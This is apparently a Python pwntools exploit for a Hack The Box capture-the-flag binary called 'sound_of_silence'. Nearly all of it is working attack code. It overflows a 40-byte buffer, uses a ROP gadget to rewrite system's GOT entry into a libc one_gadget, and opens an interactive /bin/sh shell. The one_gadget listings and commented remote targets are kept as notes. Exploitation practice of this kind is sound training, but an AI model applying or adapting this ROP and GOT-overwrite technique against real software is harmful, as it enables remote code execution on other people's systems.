'''
cyclic 1024
cyclic -l jaaa
36+4 == 40

0x00000000004004de : ret
'''

#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

offset = 40

elf = ELF('./sound_of_silence')
libc = ELF('./glibc/libc.so.6')

padding = offset*b'A'

#ip, port='161.35.168.118', 30070
#ip, port = '83.136.250.41', 46944   #HTB
#io = remote(ip,port)
io = process('./sound_of_silence')
#io = gdb.debug('./pet_companion','break main')

#0x0000000000401108 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret

#ropr void -m 10 #default ropr/ROP_gadget is not enought!!
#0x004011b2: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;


'''
one_gadget challenge/glibc/libc.so.6
0xc961a execve("/bin/sh", r12, r13)
constraints:
  [r12] == NULL || r12 == NULL
  [r13] == NULL || r13 == NULL

0xc961d execve("/bin/sh", r12, rdx)
constraints:
  [r12] == NULL || r12 == NULL
  [rdx] == NULL || rdx == NULL

0xc9620 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

0x50a47 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
  rbp == NULL || (u16)[rbp] == NULL

0xebc81 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xebc85 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xebc88 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

'''

one_gadget = 0x50a47
#one_gadget = 0xebc81
#one_gadget = 0xebc85
#one_gadget = 0xebc88

offset = one_gadget - libc.sym['system']

offset = 2**32 + offset
print(hex(offset))

read_got = elf.got['system']  #libc_base + libc.sym['read']
read_plt = elf.sym['system']
print(hex(read_got))
print(hex(read_plt))

rop_chain = p64(0x00000000004004de) + p64(0x0040073a) + p64(offset) + p64(read_got+0x3d) + p64(0)*4
rop_chain += p64(0x004005e8)
rop_chain += p64(read_plt)
#rop_chain += p64(read_got)  #error

payload = padding + rop_chain

io.recvuntil('current status:')
io.sendline(payload)
io.interactive()

